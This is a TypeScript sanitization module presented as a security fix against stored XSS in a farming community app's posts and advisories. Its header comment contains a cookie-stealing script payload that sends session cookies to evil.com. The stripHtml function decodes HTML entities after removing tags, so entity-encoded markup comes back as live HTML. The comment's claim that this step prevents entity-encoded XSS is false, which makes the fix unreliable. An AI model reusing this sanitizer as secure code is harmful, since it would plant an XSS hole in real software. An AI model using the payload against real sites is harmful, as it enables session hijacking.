/**
 * SECURITY FIX — A05: HTML Sanitization Middleware
 *
 * Vulnerability: Community post title/body and advisory content are stored
 * and returned without HTML sanitization. If the frontend renders these fields
 * as innerHTML (or a markdown renderer that allows HTML), stored XSS is possible.
 *
 * Attack scenario: An attacker posts a community message with body:
 *   <script>document.location='https://evil.com/?c='+document.cookie</script>
 * Every farmer who views the post has their session token stolen.
 *
 * Risk severity: CRITICAL (stored XSS → session hijacking)
 *
 * Remediation: Strip all HTML tags from user-supplied text fields before
 * storage. We use a simple, dependency-free approach: strip all HTML tags
 * using a regex that removes angle-bracket content. For fields that should
 * never contain HTML (titles, names, reasons), this is the correct approach.
 *
 * For fields that intentionally support rich text in the future, replace
 * stripHtml() with a DOMPurify-equivalent server-side sanitizer (e.g.,
 * the `sanitize-html` npm package with a strict allowlist).
 *
 * Why secure: Removing all HTML tags at ingestion time means no HTML ever
 * reaches the database. Even if the frontend renders the field as innerHTML,
 * there is no executable content. Defense-in-depth: the frontend should also
 * use textContent/innerText, but server-side sanitization is the authoritative
 * control.
 */

/**
 * Strip all HTML tags from a string.
 * Converts HTML entities to their text equivalents to prevent double-encoding.
 * Safe for storage in SQLite and Firestore.
 */
export function stripHtml(input: string): string {
  if (typeof input !== 'string') return '';
  return input
    // Remove entire script/style blocks including their inner content —
    // stripping tags alone would leave executable text like alert(1) visible.
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '')
    .replace(/<svg\b[^<]*(?:(?!<\/svg>)<[^<]*)*<\/svg>/gi, '')
    // Remove all remaining HTML tags (including self-closing and malformed)
    .replace(/<[^>]*>/g, '')
    // Decode common HTML entities to prevent entity-encoded XSS
    .replace(/&amp;/g,  '&')
    .replace(/&lt;/g,   '<')
    .replace(/&gt;/g,   '>')
    .replace(/&quot;/g, '"')
    .replace(/&#x27;/g, "'")
    .replace(/&#x2F;/g, '/')
    .replace(/&#39;/g,  "'")
    // Collapse multiple whitespace to single space
    .replace(/\s+/g, ' ')
    .trim();
}

/**
 * Sanitize an object's string fields in-place.
 * Pass the field names that should be HTML-stripped.
 *
 * Usage:
 *   sanitizeFields(req.body, ['title', 'body', 'reason'])
 */
export function sanitizeFields(obj: Record<string, unknown>, fields: string[]): void {
  for (const field of fields) {
    if (typeof obj[field] === 'string') {
      obj[field] = stripHtml(obj[field] as string);
    }
  }
}

/**
 * SECURITY FIX — A05: Output encoding helper.
 * Use this when building HTML strings server-side (e.g., email templates).
 * Encodes the 5 characters that are dangerous in HTML context.
 */
export function encodeHtml(input: string): string {
  return input
    .replace(/&/g,  '&amp;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;');
}
